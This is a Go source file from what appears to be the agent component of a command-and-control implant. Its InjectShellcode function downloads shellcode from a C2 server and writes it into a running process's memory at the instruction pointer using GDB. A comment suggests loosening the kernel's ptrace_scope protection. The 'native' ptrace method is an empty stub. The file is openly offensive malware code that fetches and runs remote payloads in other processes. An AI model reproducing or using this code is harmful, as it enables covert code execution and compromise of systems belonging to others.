package agent

import (
	"fmt"
	"io/ioutil"
	"os/exec"
	"strconv"
	"strings"
)

// gdbInjectShellcode inject shellcode to a running process using GDB
// start a `sleep` process and inject to it if pid == 0
// modify /proc/sys/kernel/yama/ptrace_scope if gdb does not work
// gdb command: set (char[length])*(int*)$rip = { 0xcc }
func gdbInjectShellcode(shellcode *string, pid, shellcodeLen int) error {
	if pid == 0 {
		cmd := exec.Command("sleep", "10")
		err := cmd.Start()
		if err != nil {
			return err
		}
		pid = cmd.Process.Pid
	}

	out, err := exec.Command(UtilsPath+"/gdb", "-q", "-ex", fmt.Sprintf("set (char[%d]*(int*)$rip={%s})", shellcodeLen, *shellcode), "-ex", "c", "-ex", "q", "-p", strconv.Itoa(pid)).CombinedOutput()
	if err != nil {
		return fmt.Errorf("GDB failed (shellcode length %d): %s\n%v", shellcodeLen, out, err)
	}

	return nil
}

// goInjectShellcode pure go, using ptrace
func goInjectShellcode(shellcode *string, pid, shellcodeLen int) error {
	return nil
}

// InjectShellcode inject shellcode to a running process using various methods
func InjectShellcode(pid int, method string) (err error) {
	// prepare the shellcode
	shellcodeFile := AgentRoot + "/shellcode.txt"
	err = DownloadViaCC(CCAddress+"shellcode.txt", shellcodeFile)
	if err != nil {
		return
	}
	sc, err := ioutil.ReadFile(shellcodeFile)
	if err != nil {
		return err
	}
	shellcode := string(sc)
	shellcodeLen := strings.Count(string(shellcode), "0x")

	// dispatch
	switch method {
	case "gdb":
		err = gdbInjectShellcode(&shellcode, pid, shellcodeLen)
	case "native":
		err = goInjectShellcode(&shellcode, pid, shellcodeLen)
	default:
		err = fmt.Errorf("%s is not supported", method)
	}
	return
}
